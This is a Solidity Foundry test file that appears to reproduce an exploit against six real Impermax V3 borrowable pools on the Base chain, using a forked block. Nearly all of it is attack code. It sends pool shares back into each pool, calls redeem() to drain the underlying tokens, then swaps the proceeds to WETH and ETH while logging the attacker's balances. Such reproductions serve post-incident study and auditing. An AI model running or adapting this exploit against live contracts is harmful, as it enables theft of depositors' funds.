// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IUniSwapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface ImpermaxV3Borrowable is IERC20 {
    function underlying() external view returns (address);
    function factory() external view returns (address);
    function totalBalance() external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function exchangeRate() external returns (uint);
    function mint(address minter) external returns (uint mintTokens);
    function redeem(address redeemer) external returns (uint redeemAmount);
    function skim(address to) external;
    function sync() external;
}

contract ImpermaxV3PoC is Test {
    ImpermaxV3Exploit exploitContract;
    constructor() {
        // Fork Mainnet chain at block just before the exploit
        vm.createSelectFork("base", 38047162 - 1);
        vm.warp(1762883671);
    }

    function testExploit() public {
        exploitContract = new ImpermaxV3Exploit();
        exploitContract.exploit();
    }
}

contract ImpermaxV3Exploit is Test {
    ImpermaxV3Borrowable[] impermaxBorrowable = new ImpermaxV3Borrowable[](6);
    IERC20 usdc = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IUniSwapV3Router router =
        IUniSwapV3Router(0x2626664c2603336E57B271c5C0b26F421741e481);

    WETH weth = WETH(0x4200000000000000000000000000000000000006);

    constructor() {
        impermaxBorrowable[0] = ImpermaxV3Borrowable(
            0xeF9C119baE8B8Aa637c6454F1E920525966a8ac4
        );
        impermaxBorrowable[1] = ImpermaxV3Borrowable(
            0x0B99BfcA41CfEA3d65357B3ba7F1d76C225B65Bf
        );
        impermaxBorrowable[2] = ImpermaxV3Borrowable(
            0xA2cbC162d22a574BE74e9Fd2e0B2Db4FD6362789
        );
        impermaxBorrowable[3] = ImpermaxV3Borrowable(
            0x75CebA9394459f1708a16bfd5886074fF9107fbA
        );
        impermaxBorrowable[4] = ImpermaxV3Borrowable(
            0x32e06f6f4Dda8e044557e85d650A69c7A4e09096
        );
        impermaxBorrowable[5] = ImpermaxV3Borrowable(
            0x8113176a19B774f060F818C7851a4FEa7f2f7655
        );
        for (uint i = 0; i < impermaxBorrowable.length; i++)
            deal(address(impermaxBorrowable[i]), address(this), 100000000000);
        deal(address(cbBTC), address(this), 100000000000);
    }

    function exploit() public {
        for (uint i = 0; i < impermaxBorrowable.length; i++) {
            IERC20 underlyingToken = IERC20(impermaxBorrowable[i].underlying());
            console.log("");
            console.log(
                "Exploiting Impermax V3 Borrowable Pool at address:",
                address(impermaxBorrowable[i])
            );
            _exploitPool(impermaxBorrowable[i], underlyingToken);
        }

        uint256 usdcBalance = usdc.balanceOf(address(this));
        console.log("\nFinal USDC balance of attacker:", usdcBalance);

        uint256 cbBTCBalance = cbBTC.balanceOf(address(this));
        console.log("\nFinal cbBTC balance of attacker:", cbBTCBalance);

        cbBTC.approve(address(router), cbBTCBalance);

        bytes memory encodedPath = abi.encodePacked(
            address(cbBTC),
            uint24(3000), // fee tier 0.3%
            address(weth)
        );

        IUniSwapV3Router.ExactInputParams memory params = IUniSwapV3Router
            .ExactInputParams({
                path: encodedPath,
                recipient: address(this),
                amountIn: 374742534,
                amountOutMinimum: 0
            });

        router.exactInput(params);

        uint256 wethBalance = weth.balanceOf(address(this));
        console.log("\nWETH balance of attacker:", wethBalance);

        weth.withdraw(wethBalance);
        console.log("\nETH balance of attacker:", address(this).balance);
    }

    // 의도적으로 pool의 underlying 토큰 잔고를 1로 만듦
    function _exploitPool(
        ImpermaxV3Borrowable _borrowablePool,
        IERC20 _underlyingToken
    ) internal {
        uint256 initialUnderlyingBalance = _underlyingToken.balanceOf(
            address(_borrowablePool)
        );
        console.log(
            "Initial underlying token balance:",
            initialUnderlyingBalance
        );

        uint256 exchangeRate = _borrowablePool.exchangeRate();
        console.log("Exchange rate before exploit:", exchangeRate);

        uint256 transferAmount = _divUp(initialUnderlyingBalance, exchangeRate);
        console.log("Transfer amount:", transferAmount);

        _borrowablePool.transfer(address(_borrowablePool), transferAmount);

        uint256 redeemAmount = _borrowablePool.redeem(address(this));
        console.log("Redeem amount:", redeemAmount);
    }

    function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * 1e18) / b;
    }

    receive() external payable {}
}
